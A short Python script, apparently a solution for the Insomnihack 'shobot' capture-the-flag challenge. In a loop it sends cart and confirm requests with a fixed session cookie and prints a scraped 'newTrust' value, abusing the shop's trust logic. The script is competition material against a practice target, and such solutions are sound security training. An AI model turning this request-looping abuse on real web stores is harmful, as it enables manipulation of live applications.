# MIT License
#
# Copyright (c) 2017 Pietro Ferretti
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import requests
import time

url_main = "http://shobot.teaser.insomnihack.ch/"
url_robot1 = "http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart"
url_robot2 = "http://shobot.teaser.insomnihack.ch/?page=article&artid=2&addToCart"
url_robot3 = "http://shobot.teaser.insomnihack.ch/?page=article&artid=3&addToCart"
url_payment = "http://shobot.teaser.insomnihack.ch/?page=cartconfirm"

cookies = dict(PHPSESSID="vq6v4jdosbm9e0js0oik5m4lb0")

while 1:
    r = requests.get(url_robot1, cookies=cookies)
    r = requests.get(url_payment, cookies=cookies)
    r = requests.get(url_main, cookies=cookies)
    print r.text.split('newTrust":')[-1][:3].strip('}')
    time.sleep(0.1)
